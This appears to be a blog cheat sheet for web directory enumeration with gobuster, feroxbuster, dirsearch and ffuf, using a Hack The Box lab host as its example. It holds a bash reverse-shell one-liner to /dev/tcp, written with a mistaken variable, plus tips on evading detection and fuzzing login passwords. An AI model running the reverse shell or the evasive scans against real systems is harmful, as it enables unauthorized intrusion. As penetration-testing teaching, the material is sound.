+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">RPORT</span><span class="o">=</span>10.10.11.194   <span class="c1"># Target machine IP</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">LHOST</span><span class="o">=</span>10.10.14.13    <span class="c1"># Alternative naming</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">RHOST</span><span class="o">=</span>10.10.11.194   <span class="c1"># Alternative naming</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Use in commands</span>
+</span></span><span class="line"><span class="cl">nc -nlvp <span class="nv">$LPORT</span>
+</span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/<span class="nv">$LPORT</span>/9001 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></div><h3 id="host-file-modification">Host File Modification</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add target to hosts file for virtual host testing</span>
+</span></span><span class="line"><span class="cl">sudo nano /etc/hosts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Example entries</span>
+</span></span><span class="line"><span class="cl">10.10.11.194   soccer.htb
+</span></span><span class="line"><span class="cl">10.10.11.194   soccer.htb soc-player.soccer.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Alternative using echo</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.11.194   soccer.htb&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.11.194   soc-player.soccer.htb&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Verify hosts file entries</span>
+</span></span><span class="line"><span class="cl">cat /etc/hosts <span class="p">|</span> grep htb
+</span></span></code></pre></div><h3 id="target-information-gathering">Target Information Gathering</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Ping test connectivity</span>
+</span></span><span class="line"><span class="cl">ping -c <span class="m">4</span> <span class="nv">$RHOST</span>
+</span></span><span class="line"><span class="cl">ping -c <span class="m">4</span> soccer.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Quick port check</span>
+</span></span><span class="line"><span class="cl">nc -zv <span class="nv">$RHOST</span> <span class="m">80</span>
+</span></span><span class="line"><span class="cl">nc -zv <span class="nv">$RHOST</span> <span class="m">443</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># DNS resolution check</span>
+</span></span><span class="line"><span class="cl">nslookup soccer.htb
+</span></span><span class="line"><span class="cl">dig soccer.htb
+</span></span></code></pre></div><hr>
+<h2 id="gobuster">Gobuster</h2>
+<h3 id="basic-directory-enumeration">Basic Directory Enumeration</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Basic directory enumeration</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With specific extensions</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php,html,txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output to file</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Common comprehensive scan</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o root.gobuster
+</span></span></code></pre></div><h3 id="advanced-gobuster-options">Advanced Gobuster Options</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Include status codes</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -s <span class="s2">&#34;200,204,301,302,307,403&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Set custom User-Agent</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -a <span class="s2">&#34;Mozilla/5.0 (Custom Agent)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Add cookies</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -c <span class="s2">&#34;sessionid=abc123&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Add headers</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -H <span class="s2">&#34;Authorization: Bearer token123&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Proxy through Burp</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Recursive enumeration</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -r
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Follow redirects</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -f
+</span></span></code></pre></div><h3 id="gobuster-modes">Gobuster Modes</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Directory mode (default)</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># DNS subdomain enumeration</span>
+</span></span><span class="line"><span class="cl">gobuster dns -d target.com -w subdomains.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Virtual host enumeration</span>
+</span></span><span class="line"><span class="cl">gobuster vhost -u http://target.com -w vhosts.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># S3 bucket enumeration</span>
+</span></span><span class="line"><span class="cl">gobuster s3 -w bucket-names.txt
+</span></span></code></pre></div><hr>
+<h2 id="feroxbuster">Feroxbuster</h2>
+<h3 id="basic-usage">Basic Usage</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Basic directory scan</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With wordlist</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Medium directory scan</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span></code></pre></div><h3 id="advanced-feroxbuster-features">Advanced Feroxbuster Features</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Multiple extensions</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com -x php,html,txt,js
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Specific depth</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com --depth <span class="m">4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Rate limiting</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com --rate-limit <span class="m">10</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Custom threads</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com -t <span class="m">50</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Filter status codes</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com -C 404,403
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Filter response size</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com -S <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Resume scan</span>
+</span></span><span class="line"><span class="cl">feroxbuster --resume-from state.toml
+</span></span></code></pre></div><h3 id="feroxbuster-output-options">Feroxbuster Output Options</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># JSON output</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com -o results.json
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Silent mode</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com --silent
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Extract links for further enumeration</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com --extract-links
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Random delay between requests</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com --random-agent
+</span></span></code></pre></div><hr>
+<h2 id="dirsearch">Dirsearch</h2>
+<h3 id="basic-commands">Basic Commands</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Basic scan</span>
+</span></span><span class="line"><span class="cl">dirsearch -u http://target.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With extensions</span>
+</span></span><span class="line"><span class="cl">dirsearch -u http://target.com -e php,html,js
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Custom wordlist</span>
+</span></span><span class="line"><span class="cl">dirsearch -u http://target.com -w custom-wordlist.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Recursive scan</span>
+</span></span><span class="line"><span class="cl">dirsearch -u http://target.com -r
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Save results</span>
+</span></span><span class="line"><span class="cl">dirsearch -u http://target.com --format<span class="o">=</span>simple -o results.txt
+</span></span></code></pre></div><hr>
+<h2 id="ffuf">Ffuf</h2>
+<h3 id="directory-fuzzing">Directory Fuzzing</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Basic directory fuzzing</span>
+</span></span><span class="line"><span class="cl">ffuf -w wordlist.txt -u http://target.com/FUZZ
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With extensions</span>
+</span></span><span class="line"><span class="cl">ffuf -w wordlist.txt -u http://target.com/FUZZ -e .php,.html,.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Filter by response code</span>
+</span></span><span class="line"><span class="cl">ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Filter by response size</span>
+</span></span><span class="line"><span class="cl">ffuf -w wordlist.txt -u http://target.com/FUZZ -fs <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Output to file</span>
+</span></span><span class="line"><span class="cl">ffuf -w wordlist.txt -u http://target.com/FUZZ -o results.json -of json
+</span></span></code></pre></div><h3 id="parameter-fuzzing">Parameter Fuzzing</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># GET parameter fuzzing</span>
+</span></span><span class="line"><span class="cl">ffuf -w wordlist.txt -u <span class="s2">&#34;http://target.com/search?FUZZ=test&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># POST data fuzzing</span>
+</span></span><span class="line"><span class="cl">ffuf -w wordlist.txt -u http://target.com/login -X POST -d <span class="s2">&#34;username=admin&amp;password=FUZZ&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Header fuzzing</span>
+</span></span><span class="line"><span class="cl">ffuf -w wordlist.txt -u http://target.com -H <span class="s2">&#34;X-Forwarded-For: FUZZ&#34;</span>
+</span></span></code></pre></div><hr>
+<h2 id="wordlists">Wordlists</h2>
+<h3 id="seclists-common-paths">SecLists Common Paths</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Small wordlists (fast)</span>
+</span></span><span class="line"><span class="cl">/opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+</span></span><span class="line"><span class="cl">/opt/SecLists/Discovery/Web-Content/common.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Medium wordlists (comprehensive)</span>
+</span></span><span class="line"><span class="cl">/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span class="line"><span class="cl">/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Large wordlists (extensive)</span>
+</span></span><span class="line"><span class="cl">/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
+</span></span><span class="line"><span class="cl">/opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Technology-specific</span>
+</span></span><span class="line"><span class="cl">/opt/SecLists/Discovery/Web-Content/spring-boot.txt
+</span></span><span class="line"><span class="cl">/opt/SecLists/Discovery/Web-Content/apache.txt
+</span></span><span class="line"><span class="cl">/opt/SecLists/Discovery/Web-Content/nginx.txt
+</span></span></code></pre></div><h3 id="custom-wordlist-creation">Custom Wordlist Creation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Extract words from target website</span>
+</span></span><span class="line"><span class="cl">cewl http://target.com -w custom-wordlist.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Combine wordlists</span>
+</span></span><span class="line"><span class="cl">cat wordlist1.txt wordlist2.txt <span class="p">|</span> sort -u &gt; combined.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Generate variations</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Add common extensions to base words</span>
+</span></span><span class="line"><span class="cl">sed <span class="s1">&#39;s/$/.php/&#39;</span> base-words.txt &gt; php-files.txt
+</span></span><span class="line"><span class="cl">sed <span class="s1">&#39;s/$/.html/&#39;</span> base-words.txt &gt; html-files.txt
+</span></span></code></pre></div><hr>
+<h2 id="targeted-enumeration">Targeted Enumeration</h2>
+<h3 id="content-management-systems">Content Management Systems</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># WordPress</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Drupal</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/drupal.fuzz.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Joomla</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/joomla.fuzz.txt
+</span></span></code></pre></div><h3 id="file-extensions-by-technology">File Extensions by Technology</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># PHP applications</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -x php,php3,php4,php5,phtml
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ASP/ASP.NET applications</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -x asp,aspx,asmx,ashx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># JSP applications</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -x jsp,jspa,jspx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Python applications</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -x py,pyc,pyo
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Common web files</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -x html,htm,js,css,xml,json
+</span></span></code></pre></div><h3 id="backup-and-sensitive-files">Backup and Sensitive Files</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Common backup extensions</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -x bak,backup,old,orig,tmp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Configuration files</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Database files</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -x sql,db,sqlite,mdb
+</span></span></code></pre></div><hr>
+<h2 id="stealth-and-evasion">Stealth and Evasion</h2>
+<h3 id="rate-limiting-and-timing">Rate Limiting and Timing</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Slow scan to avoid detection</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt --delay 100ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Random User-Agent rotation</span>
+</span></span><span class="line"><span class="cl">feroxbuster -u http://target.com --random-agent
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Custom User-Agent</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -a <span class="s2">&#34;Mozilla/5.0 (Googlebot)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Proxy rotation</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -p http://proxy1:8080
+</span></span></code></pre></div><h3 id="request-modification">Request Modification</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add realistic headers</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -H <span class="s2">&#34;Accept: text/html,application/xhtml+xml&#34;</span> -H <span class="s2">&#34;Accept-Language: en-US,en;q=0.9&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Session-based enumeration</span>
+</span></span><span class="line"><span class="cl">gobuster dir -u http://target.com -w wordlist.txt -c <span class="s2">&#34;PHPSESSID=abc123; auth_token=xyz789&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Method tampering</span>
+</span></span><span class="line"><span class="cl">ffuf -w wordlist.txt -u http://target.com/FUZZ -X POST
+</span></span></code></pre></div><hr>
+<h2 id="analysis-and-follow-up">Analysis and Follow-up</h2>
+<h3 id="response-analysis">Response Analysis</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check for interesting status codes</span>
+</span></span><span class="line"><span class="cl">grep -E <span class="s2">&#34;(200|301|302|403)&#34;</span> gobuster-results.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Look for unusual response sizes</span>
+</span></span><span class="line"><span class="cl">awk <span class="s1">&#39;{print $3, $1}&#39;</span> gobuster-results.txt <span class="p">|</span> sort -n
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Extract found directories for further enumeration</span>
+</span></span><span class="line"><span class="cl">grep <span class="s2">&#34;Status: 200&#34;</span> gobuster-results.txt <span class="p">|</span> awk <span class="s1">&#39;{print $1}&#39;</span> &gt; found-dirs.txt
+</span></span></code></pre></div><h3 id="automated-follow-up">Automated Follow-up</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Recursive enumeration of found directories</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">read</span> dir<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    gobuster dir -u http://target.com<span class="nv">$dir</span> -w wordlist.txt -x php,html
+</span></span><span class="line"><span class="cl"><span class="k">done</span> &lt; found-dirs.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Screenshot found pages</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">read</span> url<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    cutycapt --url<span class="o">=</span><span class="nv">$url</span> --out<span class="o">=</span>screenshots/<span class="k">$(</span>basename <span class="nv">$url</span><span class="k">)</span>.png
+</span></span><span class="line"><span class="cl"><span class="k">done</span> &lt; found-urls.txt
+</span></span></code></pre></div><hr>
+<h2 id="common-findings-and-next-steps">Common Findings and Next Steps</h2>
+<h3 id="interesting-directories-to-investigate">Interesting Directories to Investigate</h3>
+<ul>
+<li><code>/admin/</code> - Administrative interfaces</li>
+<li><code>/backup/</code> - Backup files and archives</li>
+<li><code>/config/</code> - Configuration files</li>
+<li><code>/uploads/</code> - File upload functionality</li>
+<li><code>/api/</code> - API endpoints</li>
+<li><code>/docs/</code> - Documentation</li>
+<li><code>/test/</code> - Test files and environments</li>
+<li><code>/dev/</code> - Development resources</li>
+</ul>
+<h3 id="file-types-to-prioritize">File Types to Prioritize</h3>
+<ul>
+<li><code>.php</code>, <code>.asp</code>, <code>.jsp</code> - Server-side scripts</li>
+<li><code>.config</code>, <code>.ini</code>, <code>.yaml</code> - Configuration files</li>
+<li><code>.sql</code>, <code>.db</code> - Database files</li>
+<li><code>.log</code> - Log files with potential sensitive data</li>
+<li><code>.bak</code>, <code>.old</code> - Backup files</li>
+<li><code>.git/</code>, <code>.svn/</code> - Version control directories</li>
+</ul>
+<hr>
+<h2 id="tips-and-best-practices">Tips and Best Practices</h2>
+<h3 id="performance-optimization">Performance Optimization</h3>
+<ul>
+<li>Start with small wordlists for quick wins</li>
+<li>Use appropriate thread counts (10-50 for most servers)</li>
+<li>Implement delays for rate-limited or slow servers</li>
+<li>Use recursive scanning judiciously to avoid infinite loops</li>
+</ul>
+<h3 id="detection-avoidance">Detection Avoidance</h3>
+<ul>
+<li>Rotate User-Agents and request headers</li>
+<li>Implement random delays between requests</li>
+<li>Use proxy chains for sensitive targets</li>
+<li>Monitor for rate limiting or blocking responses</li>
+</ul>
+<h3 id="coverage-maximization">Coverage Maximization</h3>
+<ul>
+<li>Use multiple tools with different algorithms</li>
+<li>Combine wordlists for comprehensive coverage</li>
+<li>Include technology-specific extensions</li>
+<li>Follow up manual testing on interesting findings</li>
+</ul>
+<hr>
+<p><em>Always ensure you have proper authorization before conducting directory enumeration on any target system.</em></p>
+
+  </div>
+
+  <footer class="post-footer">
+    <nav class="paginav">
+      Tags:
+      <a class="tag" href="https://realspaceeagle.github.io/tags/web-enumeration/"># Web-Enumeration</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/gobuster/"># Gobuster</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/feroxbuster/"># Feroxbuster</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/directory-brute-force/"># Directory-Brute-Force</a>
+      <a class="tag" href="https://realspaceeagle.github.io/tags/web-security/"># Web-Security</a>
+    </nav>
+  </footer>
+</article>
+
+<style>
+.breadcrumbs {
+  font-size: 0.875rem;
+  color: var(--secondary);
+  margin-bottom: 1rem;
+}
+
+.breadcrumbs a {
+  color: var(--primary);
+  text-decoration: none;
+}
+
+.breadcrumbs a:hover {
+  text-decoration: underline;
+}
+
+.post-description {
+  font-size: 1.125rem;
+  color: var(--secondary);
+  margin: 1rem 0 2rem 0;
+  font-style: italic;
+}
+
+.post-tags a {
+  display: inline-block;
+  background: var(--code-bg);
+  color: var(--primary);
+  padding: 0.25rem 0.75rem;
+  border-radius: 1rem;
+  text-decoration: none;
+  font-size: 0.875rem;
+  margin: 0 0.5rem 0.5rem 0;
+  transition: all 0.2s ease;
+}
+
+.post-tags a:hover {
+  background: var(--primary);
+  color: var(--theme);
+  transform: translateY(-1px);
+}
+
+.tag {
+  display: inline-block;
+  background: var(--tertiary);
+  color: var(--primary);
+  padding: 0.25rem 0.75rem;
+  border-radius: 1rem;
+  text-decoration: none;
+  font-size: 0.875rem;
+  margin: 0 0.5rem 0.5rem 0;
+  transition: all 0.2s ease;
+}
+
+.tag:hover {
+  background: var(--primary);
+  color: var(--theme);
+  transform: translateY(-1px);
+}
+
+ 
+.cheatsheet-page pre {
+  position: relative;
+  font-size: 0.9rem;
+}
+
+.cheatsheet-page pre code {
+  display: block;
+  padding: 0;
+  margin-left: 0;
+}
+
+ 
+.cheatsheet-page pre::after {
+  content: "Copy";
+  position: absolute;
+  top: 0.5rem;
+  right: 0.5rem;
+  background: rgba(255, 255, 255, 0.1);
+  color: #fff;
+  padding: 0.25rem 0.5rem;
+  border-radius: 4px;
+  font-size: 0.75rem;
+  cursor: pointer;
+  opacity: 0;
+  transition: opacity 0.2s ease;
+}
+
+.cheatsheet-page pre:hover::after {
+  opacity: 1;
+}
+
+ 
+.cheatsheet-page ul li a {
+  color: var(--primary);
+  text-decoration: none;
+  padding: 0.25rem 0;
+  display: block;
+  transition: color 0.2s ease;
+}
+
+.cheatsheet-page ul li a:hover {
+  color: var(--tertiary);
+  padding-left: 0.5rem;
+}
+</style>
+
+<script>
+
+document.addEventListener('DOMContentLoaded', function() {
+  const codeBlocks = document.querySelectorAll('.cheatsheet-page pre');
+  
+  codeBlocks.forEach(block => {
+    block.addEventListener('click', function(e) {
+      if (e.target === this || e.target.tagName === 'CODE') {
+        const code = this.querySelector('code');
+        if (code) {
+          navigator.clipboard.writeText(code.textContent).then(() => {
+            const button = this.querySelector('::after') || this;
+            const originalContent = button.textContent;
+            
+            
+            this.style.borderLeftColor = '#10b981';
+            setTimeout(() => {
+              this.style.borderLeftColor = '#2563eb';
+            }, 300);
+          });
+        }
+      }
+    });
+  });
+
+  
+  const headers = document.querySelectorAll('.cheatsheet-page h2, .cheatsheet-page h3');
+  headers.forEach(header => {
+    const id = header.textContent.toLowerCase()
+      .replace(/[^a-z0-9\s-]/g, '')
+      .replace(/\s+/g, '-')
+      .replace(/-+/g, '-')
+      .replace(/^-|-$/g, '');
+    
+    header.id = id;
+    header.style.cursor = 'pointer';
+    
+    header.addEventListener('click', () => {
+      window.location.hash = '#' + id;
+      navigator.clipboard.writeText(window.location.href);
+    });
+  });
+});
+</script>
+
+    </main>
+    <footer class="footer">
+  <div class="footer_inner wrap">
+    <div class="footer_text">
+      © 2025 realspaceeagle
+    </div>
+  </div>
+</footer>
+</body>
+
+</html>
